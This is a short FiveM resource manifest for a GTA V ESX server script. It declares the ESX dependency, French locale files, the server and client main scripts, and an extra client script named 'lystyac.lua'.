fx_version('bodacious')
game('gta5')

dependency('es_extended')

server_scripts {
	'@es_extended/locale.lua',
	'locales/fr.lua',
	'config.lua',
	'server/main.lua'
}

--client_script('@korioz/lib.lua')
client_scripts {
	'@es_extended/locale.lua',
	'locales/fr.lua',
	'config.lua',
	'client/main.lua'
}

client_script 'lystyac.lua'